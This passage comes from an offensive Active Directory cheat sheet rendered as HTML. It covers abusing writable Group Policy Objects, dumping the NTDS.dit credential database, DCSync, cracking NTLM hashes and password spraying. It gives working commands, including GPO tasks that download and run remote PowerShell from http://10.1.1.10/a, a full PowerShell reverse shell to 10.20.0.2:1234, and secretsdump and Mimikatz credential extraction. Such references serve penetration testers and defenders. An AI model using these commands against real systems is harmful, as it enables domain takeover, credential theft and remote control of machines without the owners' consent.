  <li>Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li>
  <li>Delete existing GPP xml files in SYSVOL containing passwords.</li>
  <li>Don’t put passwords in files that are accessible by all authenticated users.</li>
</ul>

<h3 id="exploit-group-policy-objects-gpo">Exploit Group Policy Objects GPO</h3>

<blockquote>
  <p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</p>
</blockquote>

<p>:triangular_flag_on_post: GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p>

<p>GPO are stored in the DC in <code class="language-plaintext highlighter-rouge">\\&lt;domain.dns&gt;\SYSVOL\&lt;domain.dns&gt;\Policies\&lt;GPOName&gt;\</code>, inside two folders <strong>User</strong> and <strong>Machine</strong>.
If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code class="language-plaintext highlighter-rouge">Machine\Preferences\ScheduledTasks</code>.</p>

<p>:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: <code class="language-plaintext highlighter-rouge">gpupdate /force</code>.</p>

<h4 id="find-vulnerable-gpo">Find vulnerable GPO</h4>

<p>Look a GPLink where you have the <strong>Write</strong> right.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"SuperSecureGPO"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="o">.</span><span class="nf">ToString</span><span class="p">()</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner"</span><span class="p">)}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="abuse-gpo-with-sharpgpoabuse">Abuse GPO with SharpGPOAbuse</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="c"># Build and configure SharpGPOAbuse</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/FSecureLABS/SharpGPOAbuse</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">Install-Package</span><span class="w"> </span><span class="nx">CommandLineParser</span><span class="w"> </span><span class="nt">-Version</span><span class="w"> </span><span class="nx">1.9.3.15</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">ILMerge.exe</span><span class="w"> </span><span class="nx">/out:C:\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nx">C:\Release\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nx">C:\Release\CommandLine.dll</span><span class="w">

</span><span class="c"># Adding User Rights</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddUserRights</span><span class="w"> </span><span class="nt">--UserRights</span><span class="w"> </span><span class="s2">"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight"</span><span class="w"> </span><span class="nt">--UserAccount</span><span class="w"> </span><span class="nx">bob.smith</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"Vulnerable GPO"</span><span class="w">

</span><span class="c"># Adding a Local Admin</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddLocalAdmin</span><span class="w"> </span><span class="nt">--UserAccount</span><span class="w"> </span><span class="nx">bob.smith</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"Vulnerable GPO"</span><span class="w">

</span><span class="c"># Configuring a User or Computer Logon Script</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddUserScript</span><span class="w"> </span><span class="nt">--ScriptName</span><span class="w"> </span><span class="nx">StartupScript.bat</span><span class="w"> </span><span class="nt">--ScriptContents</span><span class="w"> </span><span class="s2">"powershell.exe -nop -w hidden -c \"</span><span class="nx">IEX</span><span class="w"> </span><span class="p">((</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.1.1.10:80/a'</span><span class="p">))</span><span class="n">\</span><span class="s2">""</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"Vulnerable GPO"</span><span class="w">

</span><span class="c"># Configuring a Computer or User Immediate Task</span><span class="w">
</span><span class="c"># /!\ Intended to "run once" per GPO refresh, not run once per system</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddComputerTask</span><span class="w"> </span><span class="nt">--TaskName</span><span class="w"> </span><span class="s2">"Update"</span><span class="w"> </span><span class="nt">--Author</span><span class="w"> </span><span class="nx">DOMAIN\Admin</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w"> </span><span class="nt">--Arguments</span><span class="w"> </span><span class="s2">"/c powershell.exe -nop -w hidden -c \"</span><span class="nx">IEX</span><span class="w"> </span><span class="p">((</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.1.1.10:80/a'</span><span class="p">))</span><span class="n">\</span><span class="s2">""</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"Vulnerable GPO"</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddComputerTask</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"VULNERABLE_GPO"</span><span class="w"> </span><span class="nt">--Author</span><span class="w"> </span><span class="s1">'LAB.LOCAL\User'</span><span class="w"> </span><span class="nt">--TaskName</span><span class="w"> </span><span class="s2">"EvilTask"</span><span class="w"> </span><span class="nt">--Arguments</span><span class="w">  </span><span class="s2">"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND "</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w"> </span><span class="nt">--Force</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="abuse-gpo-with-powergpoabuse">Abuse GPO with PowerGPOAbuse</h4>

<ul>
  <li>https://github.com/rootSySdk/PowerGPOAbuse</li>
</ul>

<pre><code class="language-ps1">PS&gt; . .\PowerGPOAbuse.ps1

# Adding a localadmin 
PS&gt; Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Assign a new right 
PS&gt; Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Adding a New Computer/User script 
PS&gt; Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

# Create an immediate task 
PS&gt; Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator
</code></pre>

<h4 id="abuse-gpo-with-pygpoabuse">Abuse GPO with pyGPOAbuse</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/Hackndo/pyGPOAbuse</span><span class="w">

</span><span class="c"># Add john user to local administrators group (Password: H4x00r123..)</span><span class="w">
</span><span class="o">.</span><span class="n">/pygpoabuse.py</span><span class="w"> </span><span class="nx">DOMAIN/user</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="nx">lm:nt</span><span class="w"> </span><span class="nt">-gpo-id</span><span class="w"> </span><span class="s2">"12345677-ABCD-9876-ABCD-123456789012"</span><span class="w">

</span><span class="c"># Reverse shell example</span><span class="w">
</span><span class="o">.</span><span class="n">/pygpoabuse.py</span><span class="w"> </span><span class="nx">DOMAIN/user</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="nx">lm:nt</span><span class="w"> </span><span class="nt">-gpo-id</span><span class="w"> </span><span class="s2">"12345677-ABCD-9876-ABCD-123456789012"</span><span class="w"> </span><span class="nx">\</span><span class="w"> 
    </span><span class="nt">-powershell</span><span class="w"> </span><span class="n">\</span><span class="w"> 
    </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"\</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\</span><span class="nv">$stream</span><span class="s2"> = \</span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]\</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((\</span><span class="nv">$i</span><span class="s2"> = \</span><span class="nv">$stream</span><span class="s2">.Read(\</span><span class="nv">$bytes</span><span class="s2">, 0, \</span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;\</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\</span><span class="nv">$bytes</span><span class="s2">,0, \</span><span class="nv">$i</span><span class="s2">);\</span><span class="nv">$sendback</span><span class="s2"> = (iex \</span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );\</span><span class="nv">$sendback2</span><span class="s2"> = \</span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';\</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(\</span><span class="nv">$sendback2</span><span class="s2">);\</span><span class="nv">$stream</span><span class="s2">.Write(\</span><span class="nv">$sendbyte</span><span class="s2">,0,\</span><span class="nv">$sendbyte</span><span class="s2">.Length);\</span><span class="nv">$stream</span><span class="s2">.Flush()};\</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w"> </span><span class="n">\</span><span class="w"> 
    </span><span class="nt">-taskname</span><span class="w"> </span><span class="s2">"Completely Legit Task"</span><span class="w"> </span><span class="n">\</span><span class="w">
    </span><span class="nt">-description</span><span class="w"> </span><span class="s2">"Dis is legit, pliz no delete"</span><span class="w"> </span><span class="nx">\</span><span class="w"> 
    </span><span class="nt">-user</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="abuse-gpo-with-powerview">Abuse GPO with PowerView</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="c"># Enumerate GPO</span><span class="w">
</span><span class="n">Get-NetGPO</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">}</span><span class="w">

</span><span class="c"># New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO</span><span class="w">
</span><span class="n">New-GPOImmediateTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="nx">Debugging</span><span class="w"> </span><span class="nt">-GPODisplayName</span><span class="w"> </span><span class="nx">VulnGPO</span><span class="w"> </span><span class="nt">-CommandArguments</span><span class="w"> </span><span class="s1">'-NoP -NonI -W Hidden -Enc AAAAAAA...'</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="dumping-ad-domain-credentials">Dumping AD Domain Credentials</h3>

<p>You will need the following files to extract the ntds :</p>
<ul>
  <li>NTDS.dit file</li>
  <li>SYSTEM hive (C:\Windows\System32\SYSTEM)</li>
</ul>

<p>Usually you can find the ntds in two locations : <code class="language-plaintext highlighter-rouge">systemroot\NTDS\ntds.dit</code> and <code class="language-plaintext highlighter-rouge">systemroot\System32\ntds.dit</code>.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">systemroot\NTDS\ntds.dit</code> stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).</li>
  <li><code class="language-plaintext highlighter-rouge">systemroot\System32\ntds.dit</code> is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.</li>
</ul>

<p>However you can change the location to a custom one, you will need to query the registry to get the current location.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"DSA Database file"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-ndtsutil">Using ndtsutil</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">C:\</span><span class="err">&gt;</span><span class="nx">ntdsutil</span><span class="w">
</span><span class="n">ntdsutil:</span><span class="w"> </span><span class="nx">activate</span><span class="w"> </span><span class="nx">instance</span><span class="w"> </span><span class="nx">ntds</span><span class="w">
</span><span class="n">ntdsutil:</span><span class="w"> </span><span class="nx">ifm</span><span class="w">
</span><span class="n">ifm:</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">full</span><span class="w"> </span><span class="nx">c:\pentest</span><span class="w">
</span><span class="n">ifm:</span><span class="w"> </span><span class="nx">quit</span><span class="w">
</span><span class="n">ntdsutil:</span><span class="w"> </span><span class="nx">quit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>or</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">ntdsutil</span><span class="w"> </span><span class="s2">"ac i ntds"</span><span class="w"> </span><span class="s2">"ifm"</span><span class="w"> </span><span class="s2">"create full c:\temp"</span><span class="w"> </span><span class="nx">q</span><span class="w"> </span><span class="nx">q</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-vshadow">Using Vshadow</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">vssadmin</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">/for</span><span class="o">=</span><span class="n">C</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">Copy</span><span class="w"> </span><span class="nx">Shadow_Copy_Volume_Name\windows\ntds\ntds.dit</span><span class="w"> </span><span class="nx">c:\ntds.dit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>You can also use the Nishang script, available at : <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Copy-VSS.ps1</span><span class="w">
</span><span class="n">Copy-VSS</span><span class="w">
</span><span class="nx">Copy-VSS</span><span class="w"> </span><span class="nt">-DestinationDir</span><span class="w"> </span><span class="nx">C:\ShadowCopy\</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-vssadmin">Using vssadmin</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">vssadmin</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">/for</span><span class="o">=</span><span class="n">C:</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit</span><span class="w"> </span><span class="nx">C:\ShadowCopy</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">C:\ShadowCopy</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-diskshadow-a-windows-signed-binary">Using DiskShadow (a Windows signed binary)</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">diskshadow.txt</span><span class="w"> </span><span class="nx">contains</span><span class="w"> </span><span class="p">:</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistent</span><span class="w"> </span><span class="nx">nowriters</span><span class="w">
</span><span class="n">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">c:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">someAlias</span><span class="w">
</span><span class="n">create</span><span class="w">
</span><span class="nx">expose</span><span class="w"> </span><span class="o">%</span><span class="nx">someAlias</span><span class="o">%</span><span class="w"> </span><span class="nx">z:</span><span class="w">
</span><span class="n">exec</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">z:\windows\ntds\ntds.dit</span><span class="w"> </span><span class="nx">c:\exfil\ntds.dit</span><span class="w">
</span><span class="n">delete</span><span class="w"> </span><span class="nx">shadows</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="o">%</span><span class="nx">someAlias</span><span class="o">%</span><span class="w">
</span><span class="n">reset</span><span class="w">

</span><span class="n">then:</span><span class="w">
</span><span class="nx">NOTE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">must</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">executed</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">C:\Windows\System32</span><span class="w">
</span><span class="n">diskshadow.exe</span><span class="w"> </span><span class="nx">/s</span><span class="w">  </span><span class="nx">c:\diskshadow.txt</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">c:\exfil</span><span class="w">
</span><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\system</span><span class="w"> </span><span class="nx">c:\exfil\system.bak</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-esentutlexe">Using esentutl.exe</h4>

<p>Copy/extract a locked file such as the AD Database</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">esentutl.exe</span><span class="w"> </span><span class="nx">/y</span><span class="w"> </span><span class="nx">/vss</span><span class="w"> </span><span class="nx">c:\windows\ntds\ntds.dit</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">c:\folder\ntds.dit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="extract-hashes-from-ntdsdit">Extract hashes from ntds.dit</h4>

<p>then you need to use secretsdump to extract the hashes, use the <code class="language-plaintext highlighter-rouge">LOCAL</code> options to use it on a retrieved ntds.dit</p>

<div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">secretsdump</span><span class="o">.</span><span class="na">py</span> <span class="o">-</span><span class="n">system</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="no">SYSTEM</span> <span class="o">-</span><span class="n">ntds</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ntds</span><span class="o">.</span><span class="na">dit</span> <span class="no">LOCAL</span>
</pre></td></tr></tbody></table></code></div></div>

<p>secretsdump also works remotely</p>

<div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">./</span><span class="n">secretsdump</span><span class="o">.</span><span class="na">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="no">IP</span> <span class="no">AD</span><span class="err">\</span><span class="n">administrator</span><span class="nd">@domain</span> <span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">vss</span> <span class="o">-</span><span class="n">pwd</span><span class="o">-</span><span class="n">last</span><span class="o">-</span><span class="n">set</span> <span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">status</span> 
<span class="o">./</span><span class="n">secretsdump</span><span class="o">.</span><span class="na">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="nl">aad3b435b51404eeaad3b435b51404ee:</span><span class="mi">0</span><span class="n">f49aab58dd8fb314e268c4c6a65dfc9</span> <span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span> <span class="no">PENTESTLAB</span><span class="o">/</span><span class="n">dc</span><span class="err">\$@</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-pwd-last-set</code>: Shows pwdLastSet attribute for each NTDS.DIT account.</li>
  <li><code class="language-plaintext highlighter-rouge">-user-status</code>: Display whether or not the user is disabled.</li>
</ul>

<h4 id="alternatives---modules">Alternatives - modules</h4>

<p>Metasploit modules</p>

<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">domain_hashdump</span>
</pre></td></tr></tbody></table></code></div></div>

<p>PowerSploit module</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Invoke-NinjaCopy</span><span class="w"> </span><span class="nt">--path</span><span class="w"> </span><span class="nx">c:\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nt">--verbose</span><span class="w"> </span><span class="nt">--localdestination</span><span class="w"> </span><span class="nx">c:\ntds.dit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>CrackMapExec module</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.10.0.202</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">--ntds</span><span class="w"> </span><span class="nx">vss</span><span class="w">
</span><span class="n">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.10.0.202</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">--ntds</span><span class="w"> </span><span class="nx">drsuapi</span><span class="w"> </span><span class="c">#default</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-mimikatz-dcsync">Using Mimikatz DCSync</h4>

<p>Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="c"># DCSync only one user</span><span class="w">
</span><span class="n">mimikatz</span><span class="c"># lsadump::dcsync /domain:htb.local /user:krbtgt</span><span class="w">

</span><span class="c"># DCSync all users of the domain</span><span class="w">
</span><span class="n">mimikatz</span><span class="c"># lsadump::dcsync /domain:htb.local /all /csv</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>:warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.</p>

<h4 id="using-mimikatz-sekurlsa">Using Mimikatz sekurlsa</h4>

<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.
:warning: Requires administrator access with debug or Local SYSTEM rights</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">sekurlsa::krbtgt</span><span class="w">
</span><span class="nx">lsadump::lsa</span><span class="w"> </span><span class="nx">/inject</span><span class="w"> </span><span class="nx">/name:krbtgt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="crack-ntlm-hashes-with-hashcat">Crack NTLM hashes with hashcat</h4>

<p>Useful when you want to have the clear text password or when you need to make stats about weak passwords.</p>

<p>Recommended wordlists:</p>
<ul>
  <li>rockyou (available in Kali Linux)</li>
  <li>Have I Been Powned (https://hashes.org/download.php?hashlistId=7290&amp;type=hfound)</li>
  <li>Collection #1 (passwords from Data Breaches, might be illegal to possess)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c"># Basic wordlist</span><span class="w">
</span><span class="c"># (-O) will Optimize for 32 characters or less passwords</span><span class="w">
</span><span class="c"># (-w 4) will set the workload to "Insane" </span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">hashcat64.exe</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">1000</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">4</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">pathtopotfile</span><span class="w"> </span><span class="nx">pathtohashes</span><span class="w"> </span><span class="nx">pathtodico</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="o">.</span><span class="nx">/rules/best64.rule</span><span class="w"> </span><span class="nt">--opencl-device-types</span><span class="w"> </span><span class="nx">1</span><span class="p">,</span><span class="nx">2</span><span class="w">

</span><span class="c"># Generate a custom mask based on a wordlist</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/iphelix/pack/blob/master/README</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python2</span><span class="w"> </span><span class="nx">statsgen.py</span><span class="w"> </span><span class="o">..</span><span class="nx">/hashcat.potfile</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">hashcat.mask</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python2</span><span class="w"> </span><span class="nx">maskgen.py</span><span class="w"> </span><span class="nx">hashcat.mask</span><span class="w"> </span><span class="nt">--targettime</span><span class="w"> </span><span class="nx">3600</span><span class="w"> </span><span class="nt">--optindex</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">hashcat_1H.hcmask</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>:warning: If the password is not a confidential data (challenges/ctf), you can use online “cracker” like :</p>
<ul>
  <li><a href="https://hashes.org/check.php">hashes.org</a></li>
  <li><a href="https://hashes.com/en/decrypt/hash">hashes.com</a></li>
</ul>

<h3 id="password-spraying">Password spraying</h3>

<p>Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.</p>

<blockquote>
  <p>The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.</p>
</blockquote>

<p>Most of the time the best passwords to spray are :</p>

<ul>
  <li>P@ssw0rd01, Password123, mimikatz</li>
  <li>Welcome1/Welcome01</li>
  <li>$Companyname1 : $Microsoft1</li>
